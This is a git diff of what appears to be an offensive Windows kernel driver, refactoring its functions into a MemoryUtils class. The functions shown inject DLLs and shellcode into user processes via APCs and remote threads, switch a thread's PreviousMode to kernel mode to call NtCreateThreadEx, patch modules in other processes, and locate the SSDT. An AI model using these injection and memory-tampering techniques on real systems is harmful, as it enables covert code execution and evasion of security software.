@@ -1,6 +1,14 @@
 #include "pch.h"
 #include "MemoryUtils.hpp"
 
+MemoryUtils::MemoryUtils() {
+	this->NtCreateThreadEx = NULL;
+	this->ssdt = NULL;
+
+	if (NT_SUCCESS(GetSSDTAddress()))
+		this->NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
+}
+
 /*
 * Description:
 * InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
@@ -11,7 +19,7 @@
 * Returns:
 * @status  [NTSTATUS]		 -- Whether successfuly injected or not.
 */
-NTSTATUS InjectDllAPC(DllInformation* DllInfo) {
+NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInformation ShellcodeInfo{};
 	PVOID shellcode = NULL;
 	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
@@ -60,7 +68,7 @@ CleanUp:
 * Returns:
 * @status  [NTSTATUS]		 -- Whether successfuly injected or not.
 */
-NTSTATUS InjectDllThread(DllInformation* DllInfo) {
+NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid{};
 	KAPC_STATE state;
@@ -116,7 +124,7 @@ NTSTATUS InjectDllThread(DllInformation* DllInfo) {
 	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
 	CHAR tmpPreviousMode = *previousMode;
 	*previousMode = KernelMode;
-	status = NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)loadLibraryAddress, remoteAddress, 0, NULL, NULL, NULL, NULL);
+	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)loadLibraryAddress, remoteAddress, 0, NULL, NULL, NULL, NULL);
 	*previousMode = tmpPreviousMode;
 
 CleanUp:
@@ -145,7 +153,7 @@ CleanUp:
 * Returns:
 * @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
 */
-NTSTATUS InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
+NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid{};
 	HANDLE hProcess = NULL;
@@ -247,7 +255,7 @@ CleanUp:
 * Returns:
 * @status  [NTSTATUS]		 -- Whether successfuly injected or not.
 */
-NTSTATUS InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
+NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid{};
 	HANDLE hProcess = NULL;
@@ -286,7 +294,7 @@ NTSTATUS InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
 	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
 	CHAR tmpPreviousMode = *previousMode;
 	*previousMode = KernelMode;
-	status = NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
+	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
 	*previousMode = tmpPreviousMode;
 
 CleanUp:
@@ -315,7 +323,7 @@ CleanUp:
 * Returns:
 * @status			 [NTSTATUS]		  -- Whether successfuly patched or not.
 */
-NTSTATUS PatchModule(PatchedModule* ModuleInformation) {
+NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
 	PEPROCESS TargetProcess;
 	KAPC_STATE state;
 
@@ -389,7 +397,7 @@ CleanUp:
 * Returns:
 * @status			 [NTSTATUS]	 -- Whether successfuly written or not.
 */
-NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
+NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
 	HANDLE hTargetProcess;
 	ULONG oldProtection;
 	SIZE_T patchLen;
@@ -462,7 +470,7 @@ NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, 
 * Returns:
 * @status		 [NTSTATUS]	 -- Whether successfuly read or not.
 */
-NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
+NTSTATUS MemoryUtils::KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
 	SIZE_T bytesRead;
 
 	if (mode != KernelMode && mode != UserMode) {
@@ -494,7 +502,7 @@ NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targe
 * Returns:
 * @moduleBase [PVOID]	  -- Base address of the module if found, else null.
 */
-PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
+PVOID MemoryUtils::GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 	PVOID moduleBase = NULL;
 	LARGE_INTEGER time = { 0 };
 	time.QuadPart = -100ll * 10 * 1000;
@@ -542,7 +550,7 @@ PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 * Returns:
 * @functionAddress [PVOID] -- Function address if found, else null.
 */
-PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
+PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 	PVOID functionAddress = NULL;
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
 
@@ -593,7 +601,7 @@ PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 * Returns:
 * @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
 */
-PVOID GetSSDTFunctionAddress(CHAR* functionName) {
+PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	KAPC_STATE state;
 	PEPROCESS CsrssProcess = NULL;
 	PVOID functionAddress = NULL;
@@ -668,7 +676,7 @@ PVOID GetSSDTFunctionAddress(CHAR* functionName) {
 	KeUnstackDetachProcess(&state);
 
 	if (syscall != 0)
-		functionAddress = (PUCHAR)ssdt->ServiceTableBase + (((PLONG)ssdt->ServiceTableBase)[syscall] >> 4);
+		functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);
 
 CleanUp:
 	if (CsrssProcess)
@@ -693,7 +701,7 @@ CleanUp:
 * Returns:
 * @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
 */
-NTSTATUS GetSSDTAddress() {
+NTSTATUS MemoryUtils::GetSSDTAddress() {
 	ULONG infoSize;
 	PVOID ssdtRelativeLocation = NULL;
 	PVOID ntoskrnlBase = NULL;
@@ -753,7 +761,7 @@ NTSTATUS GetSSDTAddress() {
 
 			if (ssdtRelativeLocation) {
 				status = STATUS_SUCCESS;
-				ssdt = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)ssdtRelativeLocation + *(PULONG)((PUCHAR)ssdtRelativeLocation + 3) + 7);
+				this->ssdt = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)ssdtRelativeLocation + *(PULONG)((PUCHAR)ssdtRelativeLocation + 3) + 7);
 				break;
 			}
 		}
@@ -781,7 +789,7 @@ CleanUp:
 * Returns:
 * @address		  [PVOID]	    -- Pattern's address if found, else 0.
 */
-PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
+PVOID MemoryUtils::FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
 	bool found;
 
 	if (pattern == NULL || base == NULL || len == 0 || size == 0)
@@ -817,7 +825,7 @@ PVOID FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID ba
 * Returns:
 * @Thread	  [PETHREAD]  -- PETHREAD object if found, else null.
 */
-NTSTATUS FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
+NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
 	ULONG alertableThread;
 	ULONG guiThread;
 	PSYSTEM_PROCESS_INFO originalInfo = NULL;
